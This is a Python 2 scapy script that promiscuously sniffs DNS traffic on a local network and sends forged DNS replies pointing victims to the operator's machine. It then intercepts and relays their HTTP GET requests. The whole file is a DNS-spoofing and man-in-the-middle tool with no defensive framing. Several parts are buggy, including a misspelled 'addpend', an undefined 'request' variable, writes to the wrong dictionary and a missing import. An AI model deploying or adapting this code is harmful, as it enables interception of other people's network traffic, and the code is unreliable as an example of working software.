from scapy.all import *

import threading
import time

running = True
DnsRequestBuffer = []
HttpRequestBuffer = []
me = "192.168.0.14"
DNSServerv4 = "8.8.8.8"
DNSServerv6 = ""
DNSServer = DNSServerv4
domainMapping = {}
#me = sys.argv[0]

def DNSQuery(domainName):
	name = str(domainName)
	query = IP(dst=DNSServer)/UDP()/DNS(rd=1, qd=DNSQR(qname=name, qtype="AAAA"))
	response = sr1(query)
	for r in response[2].an:
		if r.type == "AAAA":
			domainName[name] = str(r.rdata)
			return str(r.rdata)


class DnsListener (threading.Thread):
	def __init__(self, connList):
		self.connList = connList
		threading.Thread.__init__(self)

	def run (self):
		print "Started listening"
		while running:
			request = sniff(filter="port 53", count=1, iface="eth0", promisc=1, timeout=1)
			if len(request) < 1: continue
			if not request[0].haslayer(DNS) or request[0].qr: continue
			if request[0].src == me: continue
			self.connList.append(request[0])


class DnsHijacker (threading.Thread):
	def __init__ (self, request):
		self.request = request
		threading.Thread.__init__(self)

	def run (self):
		domainName = self.request[2].qd.qname
		lookupIP = DNSQuery(domainName)
		if not lookupIP is None: return
		response = IP(dst=self.request.src)/UDP()/DNS(an=DNSRR(rrname=domainName, rdata=me))
		send(response)


class DnsRunner (threading.Thread):
	def __init__(self, connList):
		self.connList = connList
		threading.Thread.__init__(self)

	def run (self):
		while running:
			try:
				request = self.connList.pop(0)
				t = DnsHijacker(request)
				t.start()
			except IndexError:
				time.sleep(10)
				continue



class HttpListener (threading.Thread):
    def __init__(self, connList):
        self.connList = connList
        threading.Thread.__init__(self)

    def run(self):
        while running:
            request = sniff(filter="port 80", count=1, iface="eth0", timeout=1)
            if len(request) < 1: continue
            if request[0][3].load[:3] == "GET":
                self.connList.addpend(request[0])


class HttpRunner (threading.Thread):
	def __init__(self, connList):
		self.connList = connList
		threading.Thread.__init__(self)

	def run(self):
		while running:
			try:
				request = self.connList.pop(0)
				t = HttpResponder(request)
				t.start()
			except IndexError:
				time.sleep(1)
				continue


class HttpResponder (threading.Thread):
	def __init__(self, request):
		self.request = request
		threading.Thread.__init__(self)

	def run(self):
		httpReq = string.split(request[3].load, None, 3)
		domainName = httpReq[2]
		if(domainMapping[domainName]):
			destination = domainMapping[domainName]
			v6HttpReq = IP(dst=destination)/TCP(dport=80)/Raw(load=request[3].load)
			response = sr1(v6HttpReq)
			newResponse = IP(src=me, dst=request.src)/TCP()/Raw(load=response[3].load)
			send(newResponse)



dnslistener = DnsListener(DnsRequestBuffer)
dnslistener.start()

dnsrunner = DnsRunner(DnsRequestBuffer)
dnsrunner.start()

httplistener = HttpListener(HttpRequestBuffer)
httplistener.start()

httprunner = HttpRunner(HttpRequestBuffer)
httprunner.start()

while 1:
	try:
		pass
	except KeyboardInterrupt:
		running = False
		print "\nGoodbye"
		break


